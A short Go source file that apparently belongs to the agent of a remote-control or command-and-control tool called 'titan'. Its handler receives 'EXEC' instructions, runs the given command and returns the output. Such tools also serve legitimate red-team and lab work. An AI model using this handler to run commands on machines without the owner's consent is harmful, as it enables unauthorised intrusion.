package main

import (
	"fmt"

	"github.com/BradHacker/titan/models"
)

// HandleInstruction inputs an instruction and executes commands based on the action
func HandleInstruction(instruction models.Instruction) models.Instruction {
	switch instruction.Action.ActionType {
	case "EXEC":
		
		outAction, err := HandleRCE(instruction)
		if err != nil {
			fmt.Printf("Error while handling RCE: %v", err)
			return instruction
		}
		instruction.Action = outAction
	default:
		fmt.Printf("No handler available for action type \"%s\"\n", instruction.Action.ActionType)
	}
	return instruction
}

// HandleRCE handles an Action with the type "EXEC"
func HandleRCE(instruction models.Instruction) (action models.Action, err error) {
	cmd := GenerateCommand(instruction.Action.Cmd, instruction.Action.Args...)
	out, err := Execute(cmd)
	if err != nil {
		return
	}
	instruction.Action.Output = string(out)
	action = instruction.Action
	return
}